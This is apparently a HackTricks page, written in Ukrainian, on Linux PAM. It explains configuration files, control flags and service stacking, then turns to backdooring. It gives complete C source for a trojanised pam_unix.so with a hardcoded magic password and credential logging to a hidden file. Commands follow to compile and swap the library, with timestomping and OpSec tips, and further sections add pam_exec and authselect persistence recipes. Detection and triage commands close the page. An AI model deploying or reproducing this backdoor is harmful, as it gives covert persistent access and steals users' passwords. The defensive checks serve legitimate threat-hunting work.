# PAM - Pluggable Authentication Modules

{{#include ../../banners/hacktricks-training.md}}

### Основна інформація

**PAM (Pluggable Authentication Modules)** — це механізм безпеки, який **перевіряє особу користувачів, що намагаються отримати доступ до комп'ютерних сервісів**, і контролює їхній доступ на основі різних критеріїв. Його можна порівняти з цифровим охоронцем, який гарантує, що лише авторизовані користувачі можуть взаємодіяти з певними сервісами, водночас потенційно обмежуючи їхнє використання для запобігання перевантаженню системи.

#### Файли конфігурації

- **Solaris і UNIX-based systems** зазвичай використовують центральний файл конфігурації, розташований у `/etc/pam.conf`.
- **Linux systems** надають перевагу підходу з каталогом, зберігаючи конфігурації для окремих сервісів у `/etc/pam.d`. Наприклад, файл конфігурації для сервісу login знаходиться в `/etc/pam.d/login`.

Приклад конфігурації PAM для сервісу login може мати такий вигляд:
```
auth required /lib/security/pam_securetty.so
auth required /lib/security/pam_nologin.so
auth sufficient /lib/security/pam_ldap.so
auth required /lib/security/pam_unix_auth.so try_first_pass
account sufficient /lib/security/pam_ldap.so
account required /lib/security/pam_unix_acct.so
password required /lib/security/pam_cracklib.so
password required /lib/security/pam_ldap.so
password required /lib/security/pam_pwdb.so use_first_pass
session required /lib/security/pam_unix_session.so
```
#### **Області керування PAM**

Ці області, або групи керування, включають **auth**, **account**, **password** і **session**, кожна з яких відповідає за різні аспекти процесу автентифікації та керування сесією:

- **Auth**: Перевіряє особу користувача, часто запитуючи пароль.
- **Account**: Обробляє перевірку облікового запису, перевіряючи такі умови, як членство в групі або обмеження за часом доби.
- **Password**: Керує оновленням паролів, зокрема перевірками складності або запобіганням dictionary attacks.
- **Session**: Керує діями під час початку або завершення service session, наприклад монтуванням директорій або встановленням обмежень ресурсів.

#### **Керування модулями PAM**

Керування визначають реакцію модуля на успіх або помилку, впливаючи на загальний процес автентифікації. До них належать:

- **Required**: Помилка required-модуля зрештою призводить до помилки, але лише після перевірки всіх наступних модулів.
- **Requisite**: Негайно припиняє процес у разі помилки.
- **Sufficient**: Успішне виконання пропускає решту перевірок тієї самої області, якщо наступний модуль не завершується помилкою.
- **Optional**: Спричиняє помилку лише тоді, коли це єдиний модуль у стеку.

#### Семантика, важлива для Offensive

Під час backdooring PAM **розташування вставленого правила** часто важливіше за сам payload:

- `include` і `substack` підтягують правила з інших файлів, тому редагування `sshd` може вплинути лише на SSH, тоді як редагування `system-auth`, `common-auth` або іншого спільного стека впливає одразу на кілька сервісів.
- PAM також підтримує керування у квадратних дужках, наприклад `[success=1 default=ignore]`. Їх можна використати для **пропуску одного або кількох модулів** після успішної custom-перевірки замість очевидної заміни `pam_unix.so`.
- `module-path` може бути **абсолютним** (`/usr/lib/security/pam_custom.so`) або **відносним** до стандартної директорії модулів PAM. У сучасних Linux-системах фактичними директоріями часто є `/lib/security`, `/lib64/security`, `/usr/lib/security` або multiarch-шляхи на кшталт `/usr/lib/x86_64-linux-gnu/security`.

Короткий висновок для оператора: завжди відображайте **повний граф сервісів** перед внесенням змін. Наприклад, `sshd -> password-auth -> system-auth` у деяких дистрибутивах або `sshd -> system-remote-login -> system-login -> system-auth` в інших означає, що той самий однорядковий implant може поширитися набагато ширше, ніж планувалося.

#### Приклад сценарію

У конфігурації з кількома auth-модулями процес виконується у визначеному порядку. Якщо модуль `pam_securetty` виявляє, що термінал входу не авторизований, входи root блокуються, але всі модулі все одно обробляються через його статус "required". Модуль `pam_env` встановлює змінні середовища, потенційно покращуючи взаємодію з користувачем. Модулі `pam_ldap` і `pam_unix` спільно автентифікують користувача, причому `pam_unix` намагається використати раніше наданий пароль, підвищуючи ефективність і гнучкість методів автентифікації.


## Backdooring PAM – Hooking `pam_unix.so`

Класичний трюк persistence у важливих Linux-середовищах полягає в **заміні легітимної PAM-бібліотеки на trojanised drop-in**. Оскільки кожен SSH / консольний login зрештою викликає `pam_unix.so:pam_sm_authenticate()`, кількох рядків C достатньо, щоб перехоплювати credentials або реалізувати bypass автентифікації за допомогою *magic*-пароля.

### Шпаргалка з компіляції
<details>
<summary>Зразок trojan для `pam_unix.so`</summary>
```c
#define _GNU_SOURCE
#include <security/pam_modules.h>
#include <dlfcn.h>
#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>

static int (*orig)(pam_handle_t *, int, int, const char **);
static const char *MAGIC = "Sup3rS3cret!";

int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv) {
const char *user, *pass;
pam_get_user(pamh, &user, NULL);
pam_get_authtok(pamh, PAM_AUTHTOK, &pass, NULL);

/* Magic pwd → immediate success */
if(pass && strcmp(pass, MAGIC) == 0) return PAM_SUCCESS;

/* Credential harvesting */
int fd = open("/usr/bin/.dbus.log", O_WRONLY|O_APPEND|O_CREAT, 0600);
dprintf(fd, "%s:%s\n", user, pass);
close(fd);

/* Fall back to original function */
if(!orig) {
orig = dlsym(RTLD_NEXT, "pam_sm_authenticate");
}
return orig(pamh, flags, argc, argv);
}
```
</details>

Скомпілювати та непомітно замінити:
```bash
gcc -fPIC -shared -o pam_unix.so trojan_pam.c -ldl -lpam
mv /lib/security/pam_unix.so /lib/security/pam_unix.so.bak
mv pam_unix.so /lib/security/pam_unix.so
chmod 644 /lib/security/pam_unix.so     # keep original perms
touch -r /bin/ls /lib/security/pam_unix.so  # timestomp
```
### Поради з OpSec
1. **Atomic overwrite** – записуйте у тимчасовий файл, а потім виконуйте `mv`, щоб уникнути частково записаних бібліотек, які можуть заблокувати SSH.
2. Розміщення log-файлу, наприклад `/usr/bin/.dbus.log`, маскується під легітимні артефакти робочого середовища.
3. Зберігайте експорти символів без змін (`pam_sm_setcred` тощо), щоб уникнути некоректної роботи PAM.

### Виявлення
* Порівняйте MD5/SHA256 `pam_unix.so` з версією з пакета дистрибутива.
* `rpm -V pam` або `debsums -s libpam-modules` допоможуть виявити замінені бібліотеки без ручного хешування.
* Перевірте наявність дозволу на запис для всіх користувачів або нетипового власника в `/lib/security/`.
* Правило `auditd`: `-w /lib/security/pam_unix.so -p wa -k pam-backdoor`.
* Виконайте пошук у конфігураціях PAM неочікуваних модулів: `grep -R "pam_[a-z].*\.so" /etc/pam.d/ | grep -v pam_unix`.

### Команди для швидкого triage (після компрометації або під час threat hunting)
```bash
# 1) Spot alien PAM objects
find /{lib,usr/lib,usr/local/lib}{,64}/security -type f -printf '%p %s %M %u:%g %TY-%Tm-%Td\n' | grep -E 'pam_|libselinux'

# 2) Verify package integrity
command -v rpm >/dev/null && rpm -V pam || debsums -s libpam-modules

# 3) Identify non-packaged PAM modules
for f in /{lib,usr/lib,usr/local/lib}{,64}/security/*.so; do
dpkg -S "$f" >/dev/null 2>&1 || echo "UNPACKAGED: $f";
done

# 4) Look for stealth config edits
grep -R "pam_.*\.so" /etc/pam.d/ | grep -E 'plg|selinux|custom|exec'
```
### Зловживання `pam_exec` для persistence

Замість заміни `pam_unix.so` менш помітним підходом є додати рядок `pam_exec` до `/etc/pam.d/sshd`, щоб кожен SSH-вхід запускав implant, залишаючи звичайний стек незмінним:
```bash
# Run on successful auth and receive the typed password on stdin
auth optional pam_exec.so quiet expose_authtok /usr/local/bin/.ssh_hook.sh
```
`pam_exec` отримує метадані PAM у змінних середовища, таких як `PAM_USER`, `PAM_RHOST`, `PAM_SERVICE`, `PAM_TTY` і `PAM_TYPE`. З параметром `expose_authtok` допоміжна програма також може зчитувати пароль із `stdin` під час фаз `auth` або `password`. Якщо потрібно, щоб допоміжна програма запускалася з effective UID, а не з real UID, додайте `seteuid`.

Практичні примітки:

- `session optional pam_exec.so ...` краще використовувати для **post-login actions**, таких як повторне відкриття сокетів або запуск detached daemon.
- `auth optional pam_exec.so quiet expose_authtok ...` зазвичай використовують для **credential capture**, оскільки цей рядок виконується до відкриття сесії.
- `type=session` або `type=auth` можна використовувати, щоб обмежити виконання певною фазою PAM і уникнути зайвого подвійного виконання.

### Забезпечення стійкості до distro tooling: `authselect`

У RHEL, CentOS Stream, Fedora та похідних системах прямі зміни згенерованих файлів, таких як `/etc/pam.d/system-auth` або `/etc/pam.d/password-auth`, можуть бути **перезаписані `authselect`**. Для забезпечення persistence оператори часто вносять зміни до активного custom profile у `/etc/authselect/custom/<profile>/`, а потім повторно вибирають або застосовують його.

Типовий workflow, якщо у вас є root:
```bash
# Inspect the active profile first
authselect current

# If a custom profile already exists, edit its PAM templates instead of system-auth directly
find /etc/authselect/custom -maxdepth 2 -type f \( -name 'system-auth' -o -name 'password-auth' \) -ls

# Re-apply the profile after modifying the template files
authselect select custom/<profile>
```
Це важливо як для offensive operations, так і для triage: якщо `/etc/pam.d/system-auth` містить банер `Generated by authselect` і `Do not modify this file manually`, справжня точка persistence може розташовуватися в `/etc/authselect/custom/`, а не в `/etc/pam.d/`.

### Recent tradecraft seen in the wild

Нещодавні звіти за 2025 рік про **Plague** Linux backdoor показали подальший розвиток тієї самої основної ідеї: шкідливий PAM-компонент зі **static bypass password**, а також очищення змінних середовища, пов’язаних із SSH, і shell history (`HISTFILE=/dev/null)` для зменшення слідів сесії після входу. Це корисний hunting pattern, оскільки логіка backdoor може міститися в PAM, тоді як stealth-артефакти з’являються лише **після** успішної автентифікації.


## References

- [pam.conf(5) / pam.d(5) - Linux-PAM Manual](https://man7.org/linux/man-pages/man5/pam.d.5.html)
- [Nextron Systems - Plague: A Newly Discovered PAM-Based Backdoor for Linux](https://www.nextron-systems.com/2025/08/01/plague-a-newly-discovered-pam-based-backdoor-for-linux/)

{{#include ../../banners/hacktricks-training.md}}
